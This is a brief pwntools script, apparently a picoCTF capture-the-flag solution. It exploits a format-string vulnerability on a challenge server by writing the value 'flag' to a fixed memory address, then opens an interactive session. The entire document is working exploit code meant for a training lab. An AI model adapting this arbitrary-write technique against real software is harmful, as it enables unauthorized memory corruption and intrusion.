from pwn import *

p = remote('rhea.picoctf.net', 52882)

context.arch = 'amd64'

offset = 14
sus_addr = int('404060', 16)
new_val = int('67616c66', 16)

payload = fmtstr_payload(offset, {sus_addr: new_val})
p.sendline(payload)
p.interactive()
